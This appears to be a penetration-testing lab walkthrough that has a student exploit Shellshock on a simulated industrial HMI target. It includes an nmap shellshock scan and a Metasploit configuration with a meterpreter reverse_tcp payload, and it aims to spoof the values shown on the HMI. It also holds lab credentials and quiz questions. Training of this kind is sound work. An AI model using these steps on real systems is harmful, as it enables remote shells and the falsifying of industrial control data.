Shellshock, a critical vulnerability, targeted Unix-based systems through the popular Bash shell. It arose from mishandled environment variables, letting attackers inject malicious code for unauthorized access. This flaw risked extensive harm, from data breaches to full OS control. Rapid spread prompted quick patches by OS vendors, stressing proactive security and timely updates to prevent emerging risks.

Shellshock's impact was significant, exposing organizations and users to cyberattacks. Malicious actors exploited the vulnerability, causing financial losses, breaches, and reputational harm. The cybersecurity community responded with patches and strategies. OS vendors played a key role by releasing timely updates, and stressing their applications. Best practices emerged, like limiting Bash use and enhancing security. The incident highlighted the need for vigilant security to counter OS-level threats.
# Target Configuration

The Human-Machine Interface (HMI) is a graphical system enabling human interaction with machines, common in industrial and control settings. This system visually represents data and controls, and facilitates information exchange between operators and the monitored systems.

An HMI interface present within the Target machine will be exploited later on, allowing the display of a fabricated value instead of the genuine data.

Prior preparation is essential before taking the next step.

To disable the SNMP server, follow these steps on the simulated system that has its own SNMP server running.
`sudo service snmpd stop`

Next, initiate the Apache Web server, running alongside the target HMI Web server. The Apache server contains a bash script that could be exploited if the operating system is vulnerable to Shellshock.
Start the Apache server using the following command:
`sudo service apache2 start`
# Shellshock check

Shellshock is a critical vulnerability in Unix-based systems, including the **Apache HTTP Server with CGI** enabled. This vulnerability allows attackers to execute malicious code through improper input handling in the Bash shell's environment variables. This can lead to unauthorized access and data breaches.

To assess the Target machine for the Shellshock vulnerability, initiate an nmap scan.
On the Student machine, open the terminal window and input the following command.

`nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/shockme.cgi 192.168.1.102 --unprivileged`

Utilizing the Nmap command, a scan is conducted on the Target to identify the Shellshock vulnerability, with a specific emphasis on the provided URI.

Upon the completion of the Nmap scan, the presence of the Shellshock vulnerability is confirmed and additional reference information about the vulnerability is provided.
# Starting Conpot

Conpot is an open-source honeypot software designed to emulate various industrial control systems (ICS) protocols, like Modbus, DNP3, and S7comm, enabling the creation of realistic-looking ICS environments to detect and analyze attacks, gather threat intelligence, and employ features such as logging, alerting, and SNMP server simulation.
First, navigate back to the Target machine and log in as the user conpot:
`su conpot`

When prompted for the password, enter conpot:
`conpot`

Lastly, to initiate Conpot, enter the following command:

`/home/conpot/.local/bin/conpot --template default --logfile /var/log/conpot/conpot.log -f --temp_dir /tmp`

Based on the output of conpot when u ran it, what port did IPMI start on? 
![[Pasted image 20250804183339.png]]
# Visiting the HMI page

Navigate to the Student machine and open a Firefox tab.
Utilize the provided link below to reach the HMI page.

http://192.168.1.102:8800

Later in the process, the system uptime will be manipulated to display an arbitrary value on the page.
### Starting Metasploit

The Metasploit framework is a powerful open-source tool used for penetration testing and exploiting vulnerabilities in computer systems. The framework provides a vast collection of exploits, payloads, and auxiliary modules, making it an essential resource for security professionals.

Initiate the Metasploit Framework by entering the provided command in the terminal.
`msfconsole`
# Metasploit Configuration

In the Metasploit console, execute the provided command to select the "apache mod_cgi Bash Environment Variable Code Injection" option.
`use exploit/multi/http/apache_mod_cgi_bash_env_exec`

Set the RHOST variable to:
`set RHOSTS 192.168.1.102`

After performing a scan on the Target machine using the provided URI (/cgi-bin/shockme.cgi) to detect the shellshock vulnerability, the results revealed the vulnerability of the Target host. Proceed by configuring the TARGETURI variable to:
`set TARGETURI /cgi-bin/shockme.cgi`

Set the Payload variable to:
`set PAYLOAD linux/x86/meterpreter/reverse_tcp`

Lastly, to confirm the changes made use the following command:
`show options`

What is the RPORT of the target? 80
The preparation for Shellshock exploitation is complete.

With the settings meeting the requirements, initiate the module by executing the following command:
`exploit`



